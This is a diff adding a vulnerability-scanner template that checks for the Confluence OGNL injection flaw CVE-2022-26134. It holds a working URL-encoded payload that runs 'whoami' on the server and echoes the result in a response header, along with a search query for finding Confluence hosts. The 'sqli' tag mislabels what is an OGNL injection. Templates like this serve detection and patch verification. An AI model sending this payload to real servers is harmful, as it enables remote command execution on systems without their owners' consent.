@@ -1,0 +1,19 @@
+name: Atlassian Confluence OGNL Injection RCE CVE-2022-26134
+manual: true
+query: app="Confluence" || product="Confluence" || company="Atlassian"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
+    expression: response.status == 302 && response.raw_header.bcontains(b"X-Cmd-Response:")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-26134
+  - https://jira.atlassian.com/browse/CONFSERVER-79016
+  - https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
+  description: Confluence is Atlassian's professional enterprise knowledge management
+    and collaboration software, which can also be used to build enterprise wikis.
+  tags: sqli,rce
